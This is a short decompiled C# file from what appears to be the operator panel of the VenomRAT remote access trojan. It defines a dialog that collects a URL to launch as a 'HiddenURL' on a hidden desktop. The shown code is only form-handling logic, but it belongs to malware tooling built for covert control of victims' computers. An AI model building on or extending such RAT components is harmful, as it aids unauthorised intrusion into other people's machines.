using System;
using System.Windows.Forms;

namespace VenomRAT_HVNC.HVNC
{
    // Token: 0x0200001E RID: 30
    public partial class FrmURL : Form
    {
        // Token: 0x060000D8 RID: 216 RVA: 0x0000A71A File Offset: 0x0000A71A
        public FrmURL()
        {
            this.InitializeComponent();
        }

        // Token: 0x060000D9 RID: 217 RVA: 0x0000A728 File Offset: 0x0000A728
        private void StartHiddenURLbtn_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(this.Urlbox.Text))
                {
                    MessageBox.Show("URL is not valid!");
                }
                else
                {
                    FrmMain.saveurl = this.Urlbox.Text;
                    FrmMain.ispressed = true;
                    base.Close();
                }
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
                base.Close();
            }
        }

        // Token: 0x04000094 RID: 148
        public int count;
    }
}